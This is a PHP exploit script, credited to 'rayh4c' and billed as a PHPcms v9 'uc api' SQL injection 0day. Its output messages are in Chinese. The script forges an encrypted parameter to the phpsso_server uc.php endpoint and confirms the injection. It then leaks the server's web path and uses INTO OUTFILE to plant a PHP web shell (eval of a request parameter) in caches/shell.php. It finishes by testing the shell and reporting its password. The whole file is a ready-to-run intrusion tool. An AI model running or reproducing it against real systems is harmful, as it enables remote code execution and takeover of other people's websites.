<?php
print_r('
---------------------------------------------------------------------------
PHPcms (v9 or Old Version) uc api sql injection 0day
by rayh4c#80sec.com
---------------------------------------------------------------------------
');
 
if ($argc<3) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to phpcms
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /
php '.$argv[0].' localhost /phpcms/ -p81
php '.$argv[0].' localhost /phpcms/ -P1.1.1.1:80
---------------------------------------------------------------------------
');
    die;
}
 
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
 
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
 
function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
 
$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
 
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
 
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
 
    $ckey_length = 4;
 
    $key = md5($key ? $key : '');
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
 
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
 
    $result = '';
    $box = range(0, 255);
 
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
 
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
 
    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
 
    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
 
}
 
$SQL = "time=999999999999999999999999&ids=1'&action=deleteuser";
$SQL = urlencode(authcode($SQL, "ENCODE", ""));
echo "[1] 访问 http://".$host.$p."phpsso_server/api/uc.php?code=".$SQL."\n";
$packet ="GET ".$p."phpsso_server/api/uc.php?code=".$SQL." HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
if(strpos($html,"MySQL Errno") > 0){
echo "[2] 发现存在SQL注入漏洞"."\n";
echo "[3] 访问 http://".$host.$p."phpsso_server/api/logout.php \n";
$packet ="GET ".$p."phpsso_server/api/logout.php"." HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
preg_match('/[A-Za-z]?[:]?[\/\x5c][^<^>]+[\/\x5c]phpsso_server[\/\x5c]/',$html, $matches);
//print_r($matches);
if(!empty($matches)){
echo "[4] 得到web路径 " . $matches[0]."\n";
echo "[5] 尝试写入文件 ". str_replace("\\","/",$matches[0]) ."caches/shell.php"."\n";
$SQL = "time=999999999999999999999999&ids=1)";
$SQL.=" and 1=2 union select '<?php eval($"."_REQUEST[a]);?>' into outfile '". str_replace("\\","/",$matches[0]) ."caches/shell.php'#";
$SQL.="&action=deleteuser";
$SQL = urlencode(authcode($SQL, "ENCODE", ""));
echo "[6] 访问 http://".$host.$p."phpsso_server/api/uc.php?code=".$SQL."\n";
$packet ="GET ".$p."phpsso_server/api/uc.php?code=".$SQL." HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
if(strpos($html,"Access denied") > 0){
echo "[-] MYSQL权限过低 禁止写入文件 :(";
die;
}
echo "[6] 访问 http://".$host.$p."phpsso_server/caches/shell.php"."\n";
$packet ="GET ".$p."phpsso_server/caches/shell.php?a=phpinfo(); HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
if(strpos($html,"<title>phpinfo()</title>") > 0){
echo "[7] 测试phpinfo成功！shell密码是a ! enjoy it :)";
}
}else{
echo "[-]未取到web路径 :(";
}
}else{
echo "[*]不存在SQL注入漏洞"."\n";
}
 
?>